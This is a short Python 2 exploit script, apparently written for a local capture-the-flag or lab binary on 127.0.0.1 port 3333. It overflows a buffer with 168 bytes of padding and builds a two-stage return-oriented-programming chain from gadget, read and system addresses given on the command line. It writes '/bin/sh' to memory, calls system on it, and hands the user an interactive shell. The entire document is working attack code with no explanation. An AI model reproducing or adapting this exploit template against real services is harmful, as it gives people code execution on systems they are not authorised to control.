#!/usr/bin/env python2

import argparse
import telnetlib
from socket import *
from struct import *
import binascii


parser = argparse.ArgumentParser()
parser.add_argument("--gadget", type=lambda x: int(x, 0), required=True)
parser.add_argument("--read", type=lambda x: int(x, 0), required=True)
parser.add_argument("--system", type=lambda x: int(x, 0), required=True)
parser.add_argument("--writable", type=lambda x: int(x, 0), required=True)
args = parser.parse_args()

buf = ""
buf += "A"*168

# Stage 1
buf += pack("<Q", args.gadget)
buf += pack("<Q", 0x0)
buf += pack("<Q", args.writable)
buf += pack("<Q", 0x8)
buf += pack("<Q", args.read)

# Stage 2
buf += pack("<Q", args.gadget)
buf += pack("<Q", args.writable)
buf += pack("<Q", 0x1)
buf += pack("<Q", 0x1)
buf += pack("<Q", args.system)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("127.0.0.1", 3333))

print "Received: ", binascii.hexlify(s.recv(1204))

# Send constructed buf
print "Sending: ", binascii.hexlify(buf + "\n")
s.send(buf + "\n")

print "Received: ", binascii.hexlify(s.recv(1204))

# Send "/bin/sh"
print "Sending: \"/bin/sh\""
s.send("/bin/sh")

# Get a shell
t = telnetlib.Telnet()
t.sock = s
t.interact()
